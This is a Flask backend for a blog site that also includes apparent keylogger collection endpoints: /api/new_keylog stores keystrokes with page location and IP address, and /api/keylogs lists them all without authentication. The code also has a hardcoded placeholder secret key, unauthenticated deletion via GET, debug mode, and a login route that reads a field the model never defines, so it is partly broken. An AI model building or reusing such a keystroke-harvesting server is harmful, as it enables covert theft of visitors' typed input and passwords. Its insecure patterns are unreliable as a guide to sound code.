from flask import Flask, jsonify, json, request
from datetime import date, datetime
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from flask_cors import CORS
from sqlalchemy import true
from werkzeug.security import generate_password_hash, check_password_hash
from flask_jwt_extended import create_access_token, get_jwt, get_jwt_identity, unset_jwt_cookies, jwt_required, JWTManager
from datetime import datetime, timedelta, timezone,date

app = Flask(__name__, static_folder="../build", static_url_path='/')
CORS(app, supports_credentials=True)
#this is good for deployment

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.sqlite'
app.config['SECRET_KEY'] = 'secret-key-goes-here'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

migrate = Migrate()
migrate.init_app(app, db)

class Blogs(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(100), nullable = False)
    body = db.Column(db.String(400), nullable = False)
    author = db.Column(db.String(100), nullable = False)

class Key_strokes(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    key = db.Column(db.String(15), nullable = False)
    location = db.Column(db.String(30), nullable = False)
    ip_address = db.Column(db.String(30), nullable = True)
    timestamp = db.Column(db.DateTime, default = datetime.utcnow)

class Login(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), nullable = False)
    password = db.Column(db.String(50), nullable = False)

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route("/api/blogs" , methods = ['GET'])
def first_page():
    blog = Blogs.query.order_by(Blogs.id.desc()).all()
    all_blogs = jsonify([*map(blog_serializer, blog)])
    return all_blogs

def blog_serializer(blog):
    return{
        'id': blog.id,
        'author': blog.author,
        'body': blog.body,
        'title': blog.title,
    }

@app.route("/api/create", methods=['POST'])
def create_blog():
    request_data=json.loads(request.data)
    author = request_data['author']
    body = request_data['body']
    title = request_data['title']

    new_blog = Blogs(author = author, body = body, title = title)
    db.session.add(new_blog)
    db.session.commit()
    return {'msg': 'Blog added successfully'}


@app.route('/api/blogs/<int:id>', methods = ['GET'])
def single_blog(id):
    blog = Blogs.query.filter_by(id = id).first()
    return {
        "id": blog.id,
        "title": blog.title,
        "author": blog.author,
        "body": blog.body
    }

@app.route('/api/delete_blogs/<int:id>', methods = ['POST', 'GET'])
def delete_blog(id):
    blog = Blogs.query.filter_by(id = id).first()
    db.session.delete(blog)
    db.session.commit()
    return {"msg": "blog deleted"}

@app.route("/api/new_keylog", methods=['POST'])
def new_keylog():
    request_data=json.loads(request.data)
    key = request_data['key']
    location = request_data['location']
    ip_address = request_data['ip_address']

    print(ip_address)

    new_blog = Key_strokes(key = key, location = location, ip_address = ip_address)
    db.session.add(new_blog)
    db.session.commit()
    return {'msg': 'success added successfully'}

@app.route("/api/keylogs" , methods = ['GET'])
def key_logs():
    keyLogs = Key_strokes.query.all()
    all_logs = jsonify([*map(keylogs_serializer, keyLogs)])
    return all_logs

def keylogs_serializer(blog):
    return{
        'id': blog.id,
        'key': blog.key,
        'location': blog.location,
        'ip_address': blog.ip_address,
        'timestamp': blog.timestamp
    }

@app.route('/api/add_user',  methods=['POST'])
def register_user():
    
    request_data=json.loads(request.data)
    username = request_data['username']
    password = request_data['password']

    check_user = Login.query.filter_by(username=username).first()
    if check_user:
        return {'msg':'username already exists. Try a different one'}

    new_user = Login(username=username, password=generate_password_hash(password, method='sha256'))
    db.session.add(new_user)
    db.session.commit()

    return {"msg":"A new account has been created successfully"}

@app.route('/api/login', methods=['POST'])
def login_post():
    request_data=json.loads(request.data)
    username = request_data['username']
    password = request_data['password']

    user = Login.query.filter_by(username=username).first()

    #  take the user-supplied password
    if not user or not check_password_hash(user.password, password):
        message='Please check your login details and try again.'
        return jsonify(message),403 # if the user doesn't exist or password is wrong, reload the page
    access_token = create_access_token(identity=username)
    response = {"access_token":access_token, "user_type": user.userType, "username":user.username}
    
    return jsonify(response)

@app.after_request
def refresh_expiring_jwts(response):
    try:
        exp_timestamp = get_jwt()["exp"]
        now = datetime.now(timezone.utc)
        target_timestamp = datetime.timestamp(now + timedelta(minutes=100))
        if target_timestamp > exp_timestamp:
            access_token = create_access_token(identity=get_jwt_identity())
            data = response.get_json()
            if type(data) is dict:
                data["access_token"] = access_token
                response.data = json.dumps(data)
        return response
    except (RuntimeError, KeyError):
        #case where there is no valid JW. Just return the original responce
        return response

if __name__ == "__main__":
    db.create_all()
    app.run(debug=True)

